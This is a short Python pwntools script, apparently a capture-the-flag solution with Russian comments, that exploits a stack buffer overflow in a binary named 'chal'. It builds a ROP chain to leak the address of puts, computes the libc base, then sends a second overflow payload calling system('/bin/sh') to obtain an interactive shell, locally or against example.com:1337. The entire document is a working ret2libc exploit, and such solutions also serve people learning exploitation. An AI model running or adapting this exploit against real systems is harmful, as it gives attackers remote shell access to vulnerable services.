#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./chal")
libc = ELF("/usr/lib/libc.so.6")

def start():
    if args.REMOTE:
        return remote("example.com", 1337)
    else:
        return process("./chal")

p = start()

# Шаг 1: Утечка адреса puts@got
rop = ROP(elf)
rop.raw(b"A"*40)  # Заполняем буфер до RIP
rop.puts(elf.got["puts"])
rop.call(elf.sym["main"])  # Возвращаемся в main

p.sendlineafter(">", "1")  # Выбираем add_review
p.sendlineafter("name:", rop.chain())

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
log.success(f"libc base: {hex(libc.address)}")

# Шаг 2: system("/bin/sh")
rop = ROP(libc)
rop.system(next(libc.search(b"/bin/sh")))

payload = b"A"*40 + rop.chain()
p.sendlineafter(">", "1")
p.sendlineafter("name:", payload)

p.interactive()  # Получаем шелл!